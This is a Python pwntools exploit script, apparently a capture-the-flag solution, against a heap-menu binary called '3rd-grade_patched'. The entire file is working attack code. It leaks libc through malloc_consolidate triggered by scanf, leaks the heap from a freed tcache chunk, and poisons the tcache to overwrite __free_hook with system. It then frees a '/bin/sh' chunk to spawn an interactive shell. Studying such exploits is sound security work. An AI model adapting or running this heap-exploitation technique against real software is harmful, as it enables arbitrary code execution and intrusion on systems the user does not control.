from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './3rd-grade_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])
libc = ELF("./libc.so.6", checksec=False)

def menu():
    io.recvline_contains(b"Choose an option:")

def allocate(idx, size):
    menu()
    io.sendline(b"1")
    io.sendline(str(idx).encode())
    io.sendline(str(size).encode())

def edit(idx, content):
    menu()
    io.sendline(b"2")
    io.sendline(str(idx).encode())
    io.sendline(content)

def free(idx):
    menu()
    io.sendline(b"3")
    io.sendline(str(idx).encode())

def view(idx):
    menu()
    io.sendline(b'4')
    io.sendline(str(idx).encode())

def exit():
    menu()
    io.sendline(b'5')

io = start()

# Leaking libc and heap
##############################################################################################################################

#creating and freeing enough fastbins to help give us largebin when triggering malloc_consolidate with scanf()
for i in range(20):
    allocate(i, 0x77)

# leaving 1 unfreed to prevent top consolidation
for i in range(19):
    free(i)

io.sendline(b'1' * 0x500) # scanf will make a largebin allocation. 

allocate(21, 0x60) # this will create an chunk in unsortedbin with libc addresses
view(21)
io.recvlines(10)
libc_leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - 0x1e4070

log.success("Libc leak: %#x", libc_leak)
log.success("Libc base: %#x", libc.address)
log.success("Free hook: %#x", libc.sym['__free_hook'])

free(20)
free(21)
free(22)

# Leak heap

allocate(0, 10)
free(0)
view(0)

io.recvline()
heap_leak = u64(io.recvline()[:-1].ljust(8, b'\x00')) << 12
log.success("Heap leak: %#x", heap_leak)

# Tcache poisoning
##############################################################################################################################

# alloc 2 chunks
allocate(1, 10)
allocate(2, 10)

# free both chunks
free(1)
free(2)

# overwrite next pointer to free hook address
free_hook = ((heap_leak) >> 12) ^ (libc.sym['__free_hook'])
edit(2, p64(free_hook))

allocate(1, 10)
allocate(2, 10)

edit(2, p64(libc.sym.system)) # overwrite __free_hook with system

edit(1, b'/bin/sh\x00') 
free(1) # trigger system
io.interactive()
